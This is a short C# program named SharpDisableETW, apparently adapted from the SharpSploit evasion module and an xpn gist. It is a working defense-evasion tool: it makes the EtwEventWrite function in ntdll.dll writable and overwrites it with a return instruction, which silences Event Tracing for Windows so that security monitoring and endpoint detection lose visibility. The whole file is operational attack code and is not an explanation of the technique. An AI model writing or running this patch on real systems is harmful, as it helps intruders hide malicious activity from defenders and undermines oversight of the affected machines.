using System;
using System.Runtime.InteropServices;

namespace SharpDisableETW
{
    class Win32
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    }

    // Taken from sharpsploit: https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Evasion/ETW.cs
    // and @xpn's unhook_etw.cs gist: https://gist.github.com/xpn/6456bd5d3e46bea6a0ac4ecbae98278f

    class Program
    {
        static void Main(string[] args)
        {

            if(Environment.Is64BitOperatingSystem)
            {
                Fix(new byte[] { 0xc3, 0x00 });
                
            }
            else
            {
                Fix(new byte[] { 0xc2, 0x14, 0x00 });
            }
        }

        private static void Fix(byte[] patch)
        {
            try
            {
                uint oldProtect;

                var ntdll = Win32.LoadLibrary("ntdll.dll");
                var etwEventSend = Win32.GetProcAddress(ntdll, "EtwEventWrite");

                Win32.VirtualProtect(etwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect);
                Marshal.Copy(patch, 0, etwEventSend, patch.Length);
                Win32.VirtualProtect(etwEventSend, (UIntPtr)patch.Length, oldProtect, out oldProtect);
                Console.WriteLine("Patched E.T.W!");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Could not patch E.T.W :(");
                Console.WriteLine("{0}", ex.Message);
            }
        }
    }
}

